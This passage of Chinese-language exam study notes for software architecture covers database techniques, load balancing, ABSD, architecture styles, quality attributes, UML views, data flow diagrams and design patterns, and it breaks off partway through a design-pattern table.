id="EDI电子数据交换（P462）"><a href="#EDI电子数据交换（P462）" class="headerlink" title="EDI电子数据交换（P462）"></a>EDI电子数据交换（P462）</h3><ul><li>电子数据交换是电子商务活动中采用的一种重要技术手段。</li><li>EDI的实施需要一个公认的标准和协议，将商务活动中涉及的文件标准化和格式化。</li><li>EDI通过计算机网络，在贸易伙伴之间进行数据交换和自动处理。</li><li>EDI主要应用于企业与企业、企业与批发商之间的批发业务。</li><li>EDI的实施在技术上比较成熟，但是实施EDI需要统一数据格式，成本与代价较大。</li></ul><h3 id="嵌入式系统软硬件协同设计过程（P510）"><a href="#嵌入式系统软硬件协同设计过程（P510）" class="headerlink" title="嵌入式系统软硬件协同设计过程（P510）"></a>嵌入式系统软硬件协同设计过程（P510）</h3><ul><li>目标系统构思</li><li>系统需求描述</li><li>模块的行为描述</li><li>对模块的有效性检查</li><li>软硬件划分</li><li>性能评估</li><li>硬件综合、接口综合和软件编译</li><li>软硬件集成</li><li>软硬件协同仿真、系统评估与设计验证</li></ul><hr><h2 id="下午题"><a href="#下午题" class="headerlink" title="下午题"></a>下午题</h2><h3 id="Mysql主从复制优点"><a href="#Mysql主从复制优点" class="headerlink" title="Mysql主从复制优点"></a>Mysql主从复制优点</h3><p>主从复制机制使得同样的数据可存在多个副本，这样用户在查询数据时，可以选择该数据最近的副本访问，从而提高访问效率、降低资源使用时的冲突。</p><h3 id="Memcached缓存与数据库缓存差异"><a href="#Memcached缓存与数据库缓存差异" class="headerlink" title="Memcached缓存与数据库缓存差异"></a>Memcached缓存与数据库缓存差异</h3><ul><li>缓存架构：数据库仅缓存查询结果，适用面窄；Memcached则将数据库中的表进行缓存，对这些表的操作均可适用。</li><li>缓存有效性：数据库查询缓存时效较短（与配置有关）；Memcached缓存时效较长，只要未更新就属于有效状态。</li><li>缓存数据类型：数据库查询缓存为元组级；Memcached缓存数据为表级。</li></ul><h3 id="数据库系统提供的基本加解密方式"><a href="#数据库系统提供的基本加解密方式" class="headerlink" title="数据库系统提供的基本加解密方式"></a>数据库系统提供的基本加解密方式</h3><ul><li><strong>加解密API</strong><br>　　DBMS提供可在SQL中调用的加解密API，应用程序据此构建自己的基础架构，对数据进行加密保护。<br>加解密API的灵活性强，但构建和管理复杂。</li><li><strong>透明加密</strong><br>　　安全管理员为数据库敏感字段选择加密方式及密钥强度，应用程序访问受保护数据时，只需使用口令打开或关闭密钥表，对数据的加密和解密由DBMS自动完成。<br>　　透明加密方式管理简单，应用程序负担轻，但灵活性差。</li></ul><h3 id="反规范化技术"><a href="#反规范化技术" class="headerlink" title="反规范化技术"></a>反规范化技术</h3><p>规范化设计后，数据库设计者希望牺牲部分规范化来提高性能，这种从规范化设计回退的方法称为反规范化技术。</p><ul><li><strong>优点</strong>：降低连接操作的需求、减少外码和索引的数目、还可能减少表的数目，能够提高查询效率。</li><li><strong>缺点</strong>：数据重复存储，浪费硬盘空间；可能出现数据完整性问题；为了保障数据一致性，增加了数据维护的复杂性，降低修改速度。</li></ul><p>反规范化<strong>技术</strong>主要有：</p><ul><li><strong>增加冗余列</strong>：在多个表中保留相同列，减少或避免查询时的连接操作。</li><li><strong>增加派生列</strong>：增加由本表或其他表中数据计算生成的列，避免计算或使用集合函数。</li><li><strong>重新组表</strong>：若许多用户要查看两个表连接得到的结果数据，则把两个表重组为一个表提高性能。</li><li><strong>水平分割表</strong>：按行切割数据到多个独立表，多用于数据规模很大、或需要存放到多个介质的情况。</li><li><strong>垂直分割表</strong>：按列分割，将主键与部分列放到一个表，主键与其他列放到另一个表，减少查询时的IO次数。</li></ul><h3 id="数据库分区"><a href="#数据库分区" class="headerlink" title="数据库分区"></a>数据库分区</h3><ul><li><strong>水平分区</strong><br>　　对表的行进行划分，使得所有在表中定义的物理列，在每一个分区表中都能得以保留，从而使得表的特性能够得以保持。</li><li><strong>垂直分区</strong><br>　　对表的列进行划分，以减少表的宽度，使得某些特定列被划分到特定分区。（如把某些不常访问的超长列划分出去，则可以在保证数据相关性的同时提高访问速度）。</li></ul><h3 id="NoSQL的优缺点"><a href="#NoSQL的优缺点" class="headerlink" title="NoSQL的优缺点"></a>NoSQL的优缺点</h3><p><strong>优点</strong>：</p><ul><li>支持高并发数据访问，性能较高。</li><li>数据存储结构松散，能够灵活支持多种类型的数据格式。</li><li>能够支持海量数据的存储，且易于横向扩展。</li><li>基于分布式数据存储，不存在单点故障和性能瓶颈，系统可用性高。</li></ul><p><strong>缺点</strong>：</p><ul><li>现有产品不够成熟，大多数产品处于初创期。</li><li>并未形成一定的标准，产品种类繁多，缺乏官方支持。</li><li>不提供对SQL的支持，学习和应用迁移成本较高。</li><li>支持的特性不够丰富，现有产品提供的功能比较有限。</li></ul><h3 id="负载均衡技术（P40）"><a href="#负载均衡技术（P40）" class="headerlink" title="负载均衡技术（P40）"></a>负载均衡技术（P40）</h3><ul><li><strong>DNS 负载均衡技术</strong><br>　　在DNS中为多个IP地址配置同一个名字，因而查询这个名字的客户端只能得到其中一个地址，使得不同的客户端访问不同的服务器。（最早的技术，简单有效，但不能区分服务器差异）</li><li><strong>代理服务器/反向代理 负载均衡技术</strong><br>　　以代理服务器接受网络客户端的请求，并将这些请求动态、均匀地转发到内部网络的多台服务器，最后把请求结果返回给对应的客户端。（能实时考虑服务器的性能和负载，可缓存静态资源并提升访问速度，此时代理服务器对外表现为一个服务器）</li><li><strong>NAT（网络地址转换） 负载均衡技术</strong><br>　　将一个外部IP地址（即对内网而言的网关）映射为多个内部IP地址，对每一次TCP连接请求，均动态地使用其中一个内部地址，以达到负载均衡。（可屏蔽内网结构，缓解Internet地址紧张问题）</li><li><strong>协议内部支持 负载均衡技术</strong><br>　　由通信协议自身算法实现的负载均衡技术，如HTTP协议中的重定向能力。</li><li><strong>混合型 负载均衡技术</strong><br>　　由于多个服务器群内的软硬件设备、规模、提供服务等存在差异，可以考虑给每个服务器群采用最合适的负载均衡方式，然后又在这多个服务器群间再一次负载均衡（或集群起来），以一个整体对外提供服务，从而达到最佳性能。（有时也用于单台负载均衡设备，其性能不能满足大量请求的情况下）</li></ul><h3 id="ABSD（基于体系结构的软件架构设计）概念（P131）"><a href="#ABSD（基于体系结构的软件架构设计）概念（P131）" class="headerlink" title="ABSD（基于体系结构的软件架构设计）概念（P131）"></a>ABSD（基于体系结构的软件架构设计）概念（P131）</h3><p>ABSD强调由商业、质量和功能需求的组合驱动软件架构设计。</p><p>使用ABSD方法，设计活动可以从项目总体功能框架明确就开始，并且设计活动的开始并不意味着需求抽取和分析活动可以终止，而是应该与设计活动并行。</p><p>ABSD方法是一个自顶向下、递归细化的过程。软件系统的架构通过该方法得到细化，直到能够产生软件构件的类。</p><h3 id="ABSD方法的三个基础（P131）"><a href="#ABSD方法的三个基础（P131）" class="headerlink" title="ABSD方法的三个基础（P131）"></a>ABSD方法的三个基础（P131）</h3><ul><li>对系统功能进行分解： 基于模块的内聚和耦合技术</li><li>选择体系结构风格： 实现质量和商业需求</li><li>软件模板的使用： 设计软件结构</li></ul><h3 id="ABSD的6个主要活动-子过程（P133）"><a href="#ABSD的6个主要活动-子过程（P133）" class="headerlink" title="ABSD的6个主要活动/子过程（P133）"></a>ABSD的6个主要活动/子过程（P133）</h3><ul><li><strong>需求</strong>：用户对目标软件系统在功能、行为、性能、设计约束等方面的期望。</li><li><strong>设计</strong>：通过需求来激发和调整设计决策（设计是迭代的过程）</li><li><strong>文档化</strong>：文档是系统设计与开发人员的通信媒介、是验证体系结构时，执行预先分析的基础</li><li><strong>复审</strong>：标识潜在的风险，及早发现体系结构设计中的缺陷和错误。</li><li><strong>实现</strong>：用实体来显示出一个软件体系结构</li><li><strong>演化</strong>：使用系统演化步骤去修改应用，以满足新的需求。</li></ul><h3 id="ABSD需求过程（P133）"><a href="#ABSD需求过程（P133）" class="headerlink" title="ABSD需求过程（P133）"></a>ABSD需求过程（P133）</h3><ul><li>需求获取</li><li>标识构件：生成类图、对类进行分组、把类打包成构件</li><li>需求评审</li></ul><h3 id="ABSD设计过程（P134）"><a href="#ABSD设计过程（P134）" class="headerlink" title="ABSD设计过程（P134）"></a>ABSD设计过程（P134）</h3><ul><li>提出体系结构模型</li><li>映射构件</li><li>分析构件相互作用</li><li>产生体系结构</li><li>设计评审</li></ul><h3 id="ABSD文档化（P135）"><a href="#ABSD文档化（P135）" class="headerlink" title="ABSD文档化（P135）"></a>ABSD文档化（P135）</h3><p>体系结构文档化过程的主要输出结果是 <strong>[体系结构规格说明]</strong> 和 测试体系结构需求的 <strong>[质量设计说明书]</strong> 。</p><p>文档要从 <strong>[使用者]</strong> 的角度进行编写，必须分发给 <strong>[所有与系统相关的开发人员]**，且必须保证 **[开发者]</strong> 手上的文档是最新的。文档中的描述应该尽量避免不必要的重复，每次文档的修改都应该进行记录。</p><h3 id="ABSD复审（P135）"><a href="#ABSD复审（P135）" class="headerlink" title="ABSD复审（P135）"></a>ABSD复审（P135）</h3><p>架构设计、文档化和复审是一个迭代过程。</p><p>在一个主版本的软件架构分析后，要安排一次由 <strong>[外部人员（用户代表或领域专家）]</strong> 参加的复审。</p><p>由用户代表和领域专家决定架构是否满足需求、质量需求是否在设计中得到体现。</p><p>复审过程中，通常会对一个可运行的最小化系统进行架构评估和测试。</p><p>复审的目标是标识潜在的风险，及早发现架构设计的缺陷和错误。</p><h3 id="ABSD实现过程（P135）"><a href="#ABSD实现过程（P135）" class="headerlink" title="ABSD实现过程（P135）"></a>ABSD实现过程（P135）</h3><p>分析与设计、构件实现、构件组装、系统测试</p><h3 id="ABSD演化过程（P136）"><a href="#ABSD演化过程（P136）" class="headerlink" title="ABSD演化过程（P136）"></a>ABSD演化过程（P136）</h3><ul><li>需求变化归类</li><li>体系结构演化计划</li><li>构件变动（可利用构件库）</li><li>更新构件的相互作用</li><li>构件组装与测试</li><li>技术评审（若不能反映需求变动或不符合用户要求，需回到第2步迭代）</li><li>得到演化后的体系结构</li></ul><h3 id="系统架构风格（P137）"><a href="#系统架构风格（P137）" class="headerlink" title="系统架构风格（P137）"></a>系统架构风格（P137）</h3><p>软件架构风格是描述某一特定领域中系统组织方式的惯用模式，它定义了一类架构所共有的特征，主要包括架构定义、架构词汇表和架构约束。</p><p>其中组织方式描述了系统的组成构件及其组织方式，惯用模式则反映了众多系统共有的结构和语义。</p><table><thead><tr><th align="center">架构风格</th><th align="center">子分类</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">数据流风格</td><td align="center">批处理序列</td><td align="left">组件为一系列固定顺序的独立计算单元，组件间只通过数据传递交互，传递的数据必须是完整的</td></tr><tr><td align="center">&nbsp;</td><td align="center">管道-过滤器</td><td align="left">每个构件（过滤器）都有一组输入和输出，数据输入构件，经过内部处理，然后产生数据输出。这种风格的连接件就像是数据流传输的管道，将一个过滤器的输出传到另一个过滤器的输入</td></tr><tr><td align="center">调用/返回</td><td align="center">主程序-子程序</td><td align="left">所有的计算构件作为子程序协作工作，并由一个主程序顺序地调用这些子程序，构件通过共享存储区交换数据</td></tr><tr><td align="center">&nbsp;</td><td align="center">面向对象风格<br>（数据抽象和面向对象组织）</td><td align="left">将数据表示和基本操作封装在对象（构件）中，对象维护自身表示的完整性，对象间通过消息机制进行通信，对象交互时需要知道彼此的标识，通过对象间的协作完成计算过程</td></tr><tr><td align="center">&nbsp;</td><td align="center">分层系统<br>（层次结构）</td><td align="left">每一层的构件为上层服务，并作为下层客户。此风格支持增加抽象层的设计，允许将一个复杂问题分解成一系列增量步骤的实现，由连接件控制层间构件的拓扑约束，系统结构更清晰</td></tr><tr><td align="center">独立构件风格</td><td align="center">进程通讯</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">事件驱动系统<br>（隐式调用）</td><td align="left">构件不直接调用一个过程，而是触发或广播一个或多个事件。系统中其他构件的过程在一个或多个事件中注册，因而当一个事件触发就会导致另一模块中的过程调用。<br>基于事件驱动模式的系统具有某种意义上的递归性，形成了“部分-整体”的层次结构。</td></tr><tr><td align="center">C2风格<br>（虚拟机）</td><td align="center">解释器</td><td align="left">通常包括[正在被解释执行的伪码]和[解释引擎]。<br>伪码由[需要被解释执行的源码]和[解释引擎分析所得的中间代码]组成；<br>解释引擎包括[语法解释器]和[解释器当前的运行状态]。<br>（典型如JVM：通过虚拟架构屏蔽不同的硬件环境）</td></tr><tr><td align="center">&nbsp;</td><td align="center">基于规则的系统</td><td align="left">通过连接件绑定在一起，按照一组规则运作的并行构件网络</td></tr><tr><td align="center">仓库风格（仓库系统及知识库）</td><td align="center">数据库系统</td><td align="left">独立构件在中央数据存储区上执行，由构件控制共享数据。<br>（系统由输入数据流中的事务信息来驱动）</td></tr><tr><td align="center">&nbsp;</td><td align="center">超文本系统</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">黑板系统</td><td align="left">系统根据中央数据单元的各种状态启动各种进程，以响应知识库的变化</td></tr><tr><td align="center">复制风格</td><td align="center">复制仓库</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">缓存系统</td><td align="left">&nbsp;</td></tr><tr><td align="center">其他风格</td><td align="center">CS（二层）结构</td><td align="left">系统中的功能构件被充分隔离，客户端应用程序的开发集中于数据的显示和分析，而数据库服务器的开发则集中于数据的管理</td></tr><tr><td align="center">&nbsp;</td><td align="center">CS三层结构</td><td align="left">增加了应用服务器，可以将整个应用逻辑驻留在应用服务器上，而只有表示层存在于客户机上。三层CS把应用功能分成表示层、功能层和数据层</td></tr><tr><td align="center">&nbsp;</td><td align="center">BS风格</td><td align="left">是三层CS结构的另一种实现方式，其具体结构为 浏览器/WEB服务器/数据库</td></tr><tr><td align="center">&nbsp;</td><td align="center">CS与BS混合软件体系结构</td><td align="left">如内部采用CS风格，对外采用BS风格</td></tr><tr><td align="center">&nbsp;</td><td align="center">面向Agent软件体系结构</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">Process Control（Loop）</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">Heterogenous Architecture<br>（异构）</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">控制环路风格</td><td align="left">将过程输出的指定属性维护在一个特定的参考值（设定点）<br>该风格包括过程变量、被控变量、输入变量、操纵变量和设定点等构件，通过收集实际和理想的过程状态信息，调整过程变量使得实际状态趋于理想状态</td></tr><tr><td align="center">&nbsp;</td><td align="center">闭环结构风格</td><td align="left">通常由几个协作构件共同构成，且其中主要的构件彼此独立，能够单独进行替换和重用。但闭环结构通常只适用于处理简单任务（如机器装配等）</td></tr></tbody></table><h3 id="系统质量属性（P147）"><a href="#系统质量属性（P147）" class="headerlink" title="系统质量属性（P147）"></a>系统质量属性（P147）</h3><table><thead><tr><th align="center">质量属性</th><th align="center">子属性</th><th align="left">说明</th><th align="left">架构策略</th></tr></thead><tbody><tr><td align="center">性能</td><td align="center">&nbsp;</td><td align="left">单位时间内所处理事务的数量 或 <br>系统完成某个事务处理所需的时间</td><td align="left"><strong>资源需求</strong>：减少计算开销、控制采样频率、<br>限制执行时间、限制队列大小<br><strong>资源管理</strong>：引入并发、维持数据或计算的<br>多个副本、增加可用资源<br><strong>资源仲裁</strong>：先进先出、固定优先级调度、<br>动态优先级调度</td></tr><tr><td align="center">可靠性</td><td align="center">&nbsp;</td><td align="left">在意外或错误使用的情况下维持<br>软件系统的功能特性的基本能力</td><td align="left">用平均失效等待时间（MTTF）和<br>平均失效间隔时间（MTBF）衡量</td></tr><tr><td align="center">&nbsp;</td><td align="center">容错性</td><td align="left">在错误发生时确保系统正确的行为，<br>并进行内部修复</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">健壮性</td><td align="left">保护应用程序不受错误使用和错误<br>输入的影响，遇到意外错误事件时<br>确保应用系统处于已定义的状态</td><td align="left"></td></tr><tr><td align="center">可用性</td><td align="center">&nbsp;</td><td align="left">两次故障之间的时间长度 或 <br>出现故障时系统能够恢复正常的速度</td><td align="left"><strong>错误检测</strong>：命令/响应、心跳、异常<br><strong>错误恢复</strong>：表决、主动冗余、被动冗余、<br>备件、Shadow操作、状态再同步、<br>检查点/回滚<br><strong>错误预防</strong>：事务、进程监视器</td></tr><tr><td align="center">安全性</td><td align="center">&nbsp;</td><td align="left">系统在向合法用户提供服务的同时能够<br>阻止非授权用户使用的企图或拒绝服务<br>的能力</td><td align="left"><strong>抵抗攻击</strong>：身份验证、用户授权、<br>维护数据机密性、维护数据完整性、<br>限制暴露信息、限制访问<br><strong>检测攻击</strong>：入侵检测<br><strong>从攻击中恢复</strong>：恢复状态、识别攻击者</td></tr><tr><td align="center">&nbsp;</td><td align="center">机密性</td><td align="left">保证信息不泄露给未授权的<br>用户、实体或过程</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">完整性</td><td align="left">保证信息的完整和准确，<br>防止被非法修改</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">不可否认性</td><td align="left">&nbsp;</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">可控性</td><td align="left">保证对信息的传播及内容具有<br>控制的能力，防止为非法者所用</td><td align="left">&nbsp;</td></tr><tr><td align="center">可修改性</td><td align="center">&nbsp;</td><td align="left">能够快速地以较高的性价比<br>对系统进行变更的能力</td><td align="left"><strong>局部化修改</strong>：减少由某个变更直接影响的数量<br><strong>防止连锁反应</strong>：限制对局部化的模块的修改<br><strong>延迟绑定时间</strong>：控制部署时间和成本</td></tr><tr><td align="center">&nbsp;</td><td align="center">可维护性</td><td align="left">体现在对问题的修复</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">可扩展性</td><td align="left">使用新特性扩展软件系统</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">结构重组</td><td align="left">重新组织软件系统的<br>构件及构件间的关系</td><td align="left">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">可移植性</td><td align="left">使软件适用于多种硬件平台、用户<br>界面、操作系统、编程语言或编译器</td><td align="left">&nbsp;</td></tr><tr><td align="center">功能性</td><td align="center">&nbsp;</td><td align="left">系统完成所期望的工作的能力</td><td align="left">&nbsp;</td></tr><tr><td align="center">可变性</td><td align="center">&nbsp;</td><td align="left">经扩充或变更而成为新体系结构的能力</td><td align="left">&nbsp;</td></tr><tr><td align="center">互操作性</td><td align="center">&nbsp;</td><td align="left">与其他系统或自身环境相互作用的能力</td><td align="left">&nbsp;</td></tr><tr><td align="center">可测试性</td><td align="center">易安装性<br>易替换性<br>适应性</td><td align="left">在完成一个软件的增量开发后，<br>能轻松地对其进行测试的能力</td><td align="left"><strong>输入/输出</strong>：记录回放、将接口与实现<br>分离、特化访问路线/接口<br><strong>内部监视</strong>：内置监视器</td></tr><tr><td align="center">易用性</td><td align="center">易理解性<br>易操作性<br>易学性</td><td align="left">衡量用户使用一个软件产品<br>完成指定任务的难易程度</td><td align="left"><strong>运行时战术</strong>：维持任务的一个模型、维持<br>用户的一个模型、维持系统的一个模型<br><strong>设计时战术</strong>：将用户接口与应用的其余部分<br>分离开来</td></tr></tbody></table><h3 id="系统架构评估（P149）"><a href="#系统架构评估（P149）" class="headerlink" title="系统架构评估（P149）"></a>系统架构评估（P149）</h3><ul><li><strong>系统架构风险（风险点/非风险）</strong>：指在架构设计中潜在的、存在问题的架构决策所带来的隐患。</li><li><strong>敏感点</strong>：为了实现某种特定的质量属性，一个或多个构件所具有的特性。</li><li><strong>权衡点</strong>：是影响多个质量属性的特性，是多个质量属性的敏感点。</li></ul><h3 id="UML的10种4类模型视图（P158）"><a href="#UML的10种4类模型视图（P158）" class="headerlink" title="UML的10种4类模型视图（P158）"></a>UML的10种4类模型视图（P158）</h3><table><thead><tr><th align="center">机制</th><th align="center">分类</th><th align="center">子分类1</th><th align="center">子分类2</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">静态建模机制</td><td align="center">用例图</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="left">从用户角度描述系统功能，并指出各功能的操作者</td></tr><tr><td align="center">&nbsp;</td><td align="center">静态图</td><td align="center">类图</td><td align="center">&nbsp;</td><td align="left">描述类的静态结构（属性、操作）和类间关系（关联、依赖、聚合）</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">对象图</td><td align="center">&nbsp;</td><td align="left">类图的实例，几乎与类图标识一样，但存在生命周期</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">包图（软件体系结构图）</td><td align="center">&nbsp;</td><td align="left">由包与类组成，标识包与包的关系，描述系统的分层结构</td></tr><tr><td align="center">&nbsp;</td><td align="center">实现图</td><td align="center">构件图</td><td align="center">&nbsp;</td><td align="left">描述代码部件的物理结构及各部件间的依赖关系，<br>以分析和理解部件间的相互影响程度</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">配置图（部署图/实施图）</td><td align="center">&nbsp;</td><td align="left">定义系统中软硬件的物理体系结构</td></tr><tr><td align="center">动态建模机制</td><td align="center">行为图</td><td align="center">状态图（行为模型）</td><td align="center">&nbsp;</td><td align="left">描述类的对象所有可能的状态，及事件发生时的状态转移条件</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">活动图</td><td align="center">&nbsp;</td><td align="left">特殊的状态图，强调对象内的控制流程，描述流程化处理</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">交互图<br>（用例实现图）</td><td align="center">顺序图（时序图）</td><td align="left">描述一组对象及其收发的消息，反映对象间的交互关系，强调按<strong>时间顺序</strong>对控制流建模</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">协作图（合作图）</td><td align="left">描述一组对象间的连接及其收发的消息，反映对象间的协作关系，强调按<strong>组织结构</strong>对控制流建模</td></tr></tbody></table><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><p>数据流图（DFD）是以图形方式描述数据在系统中流动和处理的过程，由于它只反映系统必须完成的功能，因此它是一种功能模型，其包含4种基本元素：</p><ul><li>“→”箭头表示数据流，是数据在系统内传播的路径，由一组成分固定的数据组成。</li><li>“o”圆或椭圆表示加工，是对数据进行处理的单元，它接收一定的数据输入，处理后产生输出。</li><li>“=”双杠表示数据存储，即信息的静态存储，可以是文件、文件的一部分、数据库的元素等。</li><li>“□”矩形表示外部实体，是数据的源点或终点，可以是人、物或其他软件系统。</li></ul><h3 id="数据流图的常见错误类型"><a href="#数据流图的常见错误类型" class="headerlink" title="数据流图的常见错误类型"></a>数据流图的常见错误类型</h3><ul><li><strong>黑洞</strong>：加工仅有输入流，缺少输出流。</li><li><strong>奇迹</strong>：加工仅有输出流，缺少输入流。</li><li><strong>重名</strong>：多条数据流经过加工后，命名不变。</li><li><strong>错误</strong>：数据流的源点或终点错误，如：<br>　　外部实体没有经过加工处理，直接到数据存储。<br>　　外部实体之间没有加工处理，存在直接数据流。</li></ul><h3 id="数据流图、流程图的含义与区别"><a href="#数据流图、流程图的含义与区别" class="headerlink" title="数据流图、流程图的含义与区别"></a>数据流图、流程图的含义与区别</h3><p><strong>含义</strong>：<br>　　数据流图是用来说明业务处理过程、系统边界所包含的功能和系统中的数据流。<br>　　流程图展示应用程序从数据输入开始到获得输出为止的逻辑过程，描述的是处理过程的控制流。</p><p><strong>区别</strong>：</p><ul><li>数据流图中的处理过程可并行；流程图在某个时间点只能处于一个处理过程。</li><li>数据流图展现系统的数据流；流程图展现系统的控制流。</li><li>数据流图展现全局的处理过程，过程之间遵循不同的计时标准；流程图中处理过程遵循一致的计时标准。</li><li>数据流图适用于系统分析中的逻辑建模阶段；流程图适用于系统设计中的物理建模阶段。</li></ul><h3 id="数据流图设计原则"><a href="#数据流图设计原则" class="headerlink" title="数据流图设计原则"></a>数据流图设计原则</h3><ul><li><strong>复杂性最小化</strong>：DFD分层结构就是把信息划分为小的且相对独立的一大批子集，以便于单独考查每一个DFD，如果要了解某个过程更详细的信息，可以跳转到上一层的DFD再考查。</li><li><strong>接口最小化</strong>：在设计模型时，应使得模型中各个元素之间的接口数或连接数最小化。</li><li><strong>数据流一致性</strong>：一个过程和它的分解在数据流内容中应保持一致，数据流不应该存在“黑洞”，也不应该存在“奇迹”。</li></ul><h3 id="CRUD矩阵"><a href="#CRUD矩阵" class="headerlink" title="CRUD矩阵"></a>CRUD矩阵</h3><p>指利用矩阵的形式来表示各个不同用户对不同操作的动作行为。其中，C（Create）→产生，R（Read）→引用，U（Update）→更新，D（Delete）→删除。</p><blockquote><p>小诀窍：只要用户与操作之间存在关系，则至少必存在R关系。</p></blockquote><h3 id="4-1视图（P181-图P103）"><a href="#4-1视图（P181-图P103）" class="headerlink" title="4+1视图（P181 - 图P103）"></a>4+1视图（P181 - 图P103）</h3><ul><li><strong>逻辑视图</strong>：设计的对象模型，说明系统应为用户提供哪些服务</li><li><strong>过程视图</strong>：捕捉设计的并发和同步特征</li><li><strong>物理视图</strong>：描述了软件到硬件的映射，反映了分布式特性</li><li><strong>开发视图</strong>：描述了在开发环境中软件的静态组织结构</li><li><strong>用例视图</strong>：围绕上述4个视图所做的各种决定，强调从用户角度看到的或需要的系统功能，是最基本的需求分析模型。</li></ul><h3 id="设计模式（P195）"><a href="#设计模式（P195）" class="headerlink" title="设计模式（P195）"></a>设计模式（P195）</h3><ul><li><strong>创建性模式</strong>：就是创建对象的模式，抽象了实例化的过程。它帮助一个系统独立于如何创建、组合和表示它的那些对象。</li><li><strong>结构性模式</strong>：解决怎样组装现有的类，设计他们的交互方式，从而达到一定功能的目的。</li><li><strong>行为性模式</strong>：涉及到算法和对象间的职责分配。它描述了对象和类的模式，以及他们之间的通信模式，刻画了在程序运行时难以跟踪的复杂的控制流。</li></ul><blockquote><p>设计模式图例也要清楚。</p></blockquote><table><thead><tr><th align="center">分类</th><th align="center">设计模式</th><th align="left">说明</th><th align="left">应用场景</th></tr></thead><tbody><tr><td align="center">创建性模式</td><td align="center">Abstract Factory（抽象工厂）</td><td align="left">提供一个创建 [一列相关或相互依赖对象的] 接口，而无需指定具体的构造类</td><td align="left">· 期望所提供的类库，只开放接口而非实现<br>· 一系列相关的对象是共同使用的（必须保证，否则可用Factory Method作为替代）</td></tr><tr><td align="center">&nbsp;</td><td align="center">Factory Method（工厂方法）</td><td align="left">定义一个用于创建对象的接口，让子类决定将哪一个类实例化</td><td align="left">· 类不能预料它所必须创建的对象的类<br>· 类希望其子类指定它要创建的对象</td></tr><tr><td align="center">&nbsp;</td><td align="center">Builder（构建器 / 建造者）</td><td align="left">将一个复杂对象的构建与其表示相分离，使得相同的构造过程可以创建不同的对象</td><td align="left">· 创建对象的算法独立于对象的组成部分<br>· 构造过程必须允许已构建对象有不同的表示</td></tr><tr><td align="center">&nbsp;</td><td align="center">Prototype（原型）</td><td align="left">用原型实例指定创建对象的种类，并通过原型拷贝来创建新的对象</td><td align="left">· 在运行时需要实例化类（如动态载入）<br>· 类的实例是仅有的一些不同状态组合之一</td></tr><tr><td align="center">&nbsp;</td><td align="center">Singleton（单例）</td><td align="left">保证一个类仅有一个实例，并提供一个访问它的全局访问点</td><td align="left">· 只有一个类实例</td></tr><tr><td align="center">结构性模式</td><td align="center">Adapter（适配器）</td><td align="left">将一个类的接口转换成期望的另一个接口</td><td align="left">· 要使用的已有类与所需接口不匹配<br>· 所创建的可重用的类不需要兼容接口<br>· 在一个不同于已知对象接口的接口环境中使用<br>· 必须进行多个源之间的接口转换</td></tr><tr><td align="center">&nbsp;</td><td align="center">Bridge（桥接）</td><td align="left">将抽象部分与其实现部分分离，使它们均可独立地变化</td><td align="left">· 想避免抽象与实现之间存在永久性绑定<br>· 抽象及其实现可使用子类进行扩展<br>· 抽象的实现被改动对客户端无影响</td></tr><tr><td align="center">&nbsp;</td><td align="center">Composite（组合）</td><td align="left">将对象组合成树形结构，以表示[部分-整体]的层次结构，使得对单个对象和复合对象的使用具有一致性</td><td align="left">· 想要表示对象的整个或部分层次结构<br>· 想要忽略复合对象和单个对象间的差异<br>· 结构可以具有任何级别的复杂性，且为动态的</td></tr><tr><td align="center">&nbsp;</td><td align="center">Decorator（装饰者）</td><td align="left">在不修改对象外观和功能的情况下添加或删除对象功能，可动态地为一个对象添加额外的职责</td><td align="left">· 为对象动态而透明地添加职责，不影响其他对象<br>· 想要在以后可能会修改的对象中添加职责<br>· 无法通过静态子类化实现扩展</td></tr><tr><td align="center">&nbsp;</td><td align="center">Facade（外观）</td><td align="left">为子系统中的一组接口提供了一个统一的高级接口，使得子系统更易使用</td><td align="left">· 想要为复杂的子系统提供简单的接口<br>· 在客户端和抽象的实现类中存在许多依赖关系<br>· 想要对子系统进行分层</td></tr><tr><td align="center">&nbsp;</td><td align="center">Flyweight（享元 / 轻量）</td><td align="left">通过共享技术大量减少细粒度对象，避免多个具有相同信息的实例带来的开销</td><td align="left">· 应用程序使用了大量的对象<br>· 因对象数量巨大造成很高的存储开销<br>· 应用程序不依赖于对象的身份</td></tr><tr><td align="center">&nbsp;</td><td align="center">Proxy（代理）</td><td align="left">为其他对象提供一个代理以控制这个对象的访问</td><td align="left">· 需要比简单的指针更灵活、更全面的对象引用</td></tr><tr><td align="center">行为性模式</td><td align="center">Template Method（模板）</td><td align="left">定义一个操作中的算法骨架，将一些步骤迟延到子类中实现，使得可以不改变一个算法的结构即可重定义该算法某些特定步骤</td><td align="left">· 期望一次实现算法不变的部分，而由子类实现可变的行为<br>· 把子类的通用行为定义到通用类，避免重复代码</td></tr><tr><td align="center">&nbsp;</td><td align="center">Command（命令）</td><td 